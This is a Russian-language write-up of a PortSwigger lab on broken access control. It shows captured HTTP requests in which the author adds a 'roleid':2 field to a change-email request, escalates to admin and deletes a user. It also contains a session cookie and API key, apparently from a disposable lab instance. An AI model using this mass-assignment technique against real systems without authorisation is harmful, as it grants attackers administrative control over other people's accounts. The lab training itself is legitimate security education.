---
title: "User role can be modified in user profile"
date: 2025-07-17
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile"
classes: wide
---

В данной лабе есть ендпоинт `/admin`. Для получения доступа нужно установить `roleid` в 2. Для решения нужно удалить пользователя `carlos`. Даны креды `wiener`:`peter`.

```
https://0a3a00ad0400e296e61a760700300094.web-security-academy.net
```

## Solution

Зайду в аккаунт и попробую перейти на админ-панель.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_role_can_be_modified_in_user_profile/1.png){: height="200" .align-center}

В лк есть возможность сменить почту. Попробую это сделать:

```http
POST /my-account/change-email HTTP/2
Host: 0a3a00ad0400e296e61a760700300094.web-security-academy.net
Cookie: session=0HDsFaqSQFPL0OnVFYE9rMckpsRgtHBA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3a00ad0400e296e61a760700300094.web-security-academy.net/my-account?id=wiener
Content-Type: text/plain;charset=UTF-8
Content-Length: 24
Origin: https://0a3a00ad0400e296e61a760700300094.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"email":"new@mail.com"}
```

Ответ:

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 116

{
  "username": "wiener",
  "email": "new@mail.com",
  "apikey": "i8MIpGMUiEIx9oc6TvuBS30nGyS2fcNV",
  "roleid": 1
}
```

Вижу поле `roleid`. Попробую отредачить тело запроса, чтобы изменить это значение на 2:

```http
POST /my-account/change-email HTTP/2
Host: 0a3a00ad0400e296e61a760700300094.web-security-academy.net
Cookie: session=0HDsFaqSQFPL0OnVFYE9rMckpsRgtHBA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3a00ad0400e296e61a760700300094.web-security-academy.net/my-account?id=wiener
Content-Type: text/plain;charset=UTF-8
Content-Length: 38
Origin: https://0a3a00ad0400e296e61a760700300094.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"email":"new@mail.com",
"roleid":2 }
```

Ответ:

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 116

{
  "username": "wiener",
  "email": "new@mail.com",
  "apikey": "i8MIpGMUiEIx9oc6TvuBS30nGyS2fcNV",
  "roleid": 2
}
```

Попробую зайти в админ-панель:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_role_can_be_modified_in_user_profile/2.png){: height="200" .align-center}

Успех. Удалю пользователя:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_role_can_be_modified_in_user_profile/3.png){: height="200" .align-center}